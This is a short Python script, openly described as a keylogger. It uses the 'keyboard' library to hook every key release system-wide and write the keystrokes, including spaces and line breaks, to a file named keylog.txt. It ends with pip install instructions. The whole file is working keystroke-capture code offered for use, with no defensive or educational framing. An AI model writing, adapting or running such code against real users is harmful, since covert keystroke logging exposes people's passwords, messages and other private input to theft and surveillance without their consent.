## This script implements a simple keylogger using the `keyboard` library.
# It logs key presses to a file named "keylog.txt".
import keyboard

class Keylogger():
    def __init__(self, log_filenamee):
        self.f = open(log_filenamee, 'w')

    def start_logging(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        button = event.name
        if button == "space":
            button = " "
        elif button == "enter":
            button = "\n"
        self.f.write(button)
        self.f.flush()

Keylogger_obj = Keylogger("keylog.txt")
Keylogger_obj.start_logging()
         



# Note: This code requires the `keyboard` library to be installed.
# You can install it using pip: 
# pip install keyboard
    